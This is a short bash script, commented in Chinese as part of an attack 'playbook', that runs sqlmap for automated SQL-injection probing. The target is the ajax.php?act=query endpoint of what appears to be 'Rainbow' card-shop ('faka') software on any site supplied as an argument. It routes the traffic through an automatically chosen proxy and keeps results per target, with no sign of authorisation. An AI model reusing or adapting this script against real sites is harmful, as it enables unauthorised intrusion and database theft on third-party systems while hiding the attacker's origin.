#!/bin/bash
# 彩虹 ajax sqlmap 探测（历史 playbook 低优先级）
set -euo pipefail
URL="${1:?用法: $0 https://target.com}"
PROXY=$(python3 -c "import sys; sys.path.insert(0,'/data/tools/faka'); from faka_common import resolve_proxy; print(resolve_proxy('auto'))" 2>/dev/null || true)
OUT="/data/tools/faka/out/sqlmap_$(echo "$URL" | md5sum | cut -c1-8)"
mkdir -p "$OUT"

if ! command -v sqlmap >/dev/null; then
  echo "sqlmap 未安装"; exit 1
fi

PROXY_ARG=()
[ -n "$PROXY" ] && PROXY_ARG=(--proxy="$PROXY")

echo "[*] sqlmap rainbow ajax query $URL"
sqlmap -u "${URL%/}/ajax.php?act=query" --data="type=1&qq=test&page=1" \
  "${PROXY_ARG[@]}" --batch --level=2 --risk=1 --threads=3 \
  --output-dir="$OUT" 2>&1 | tee "$OUT/run.log"
echo "[+] -> $OUT"
